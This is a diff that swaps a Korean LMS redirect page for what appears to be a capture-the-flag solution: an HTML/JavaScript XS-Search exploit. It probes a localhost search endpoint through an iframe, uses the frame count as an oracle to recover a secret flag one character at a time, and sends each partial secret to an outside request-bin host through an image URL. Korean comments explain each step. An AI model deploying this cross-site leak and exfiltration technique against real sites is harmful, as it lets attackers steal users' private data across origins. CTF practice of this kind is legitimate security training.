@@ -1,6 +1,41 @@
-<html  lang="ko" xml:lang="ko">
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-
-<title>리다이랙트</title>
-</head><body><div style="margin-top: 3em; margin-left:auto; margin-right:auto; text-align:center;">본 페이지는 자동적으로 재조정됨. 아무 변화가 없으면 하단의 계속 링크를 이용하시기 바랍니다.<br /><a href="https://el2.koreatech.ac.kr/mod/quiz/view.php?id=225031">계속</a></div></body></html>
+<iframe id="iframe"></iframe> //iframe 생성
+<img id="img">
+<script>
+    async function req(url) {
+        return await new Promise((resolve, reject) => {
+            const iframe = document.getElementById("iframe");
+            iframe.src = url;
+            iframe.onload = () => {  //아까 만들어둔 iframe 내에서 요청 생성
+                if (iframe.contentWindow.frames.length != 0)  //iframe 객체가 존재하면
+                    return resolve();
+                else
+                    return reject();
+            };
+        });
+    }
+    async function search(query) {
+        try {
+            await req(
+              `http://localhost:8000/search?query=${query}`
+            );
+            return true;
+        } catch (e) {
+            return false;
+        }
+    }
+    async function exploit() {
+        let chars = "0123456789abcdef}"
+        let secret = "DH{22d1445ad68e194e044a16dc";
+        while (!secret.includes("}")) {
+            for (let c of chars) {
+                if (await search(secret + c)) { //결과가 포함되어있다면
+                    secret += c;
+                    img.src = `https://liiojuf.request.dreamhack.games/${secret}`;
+                    //문자열 추가 후 서버로 전송
+                    break;
+                }
+            }
+        }
+    }
+    exploit();
+</script>
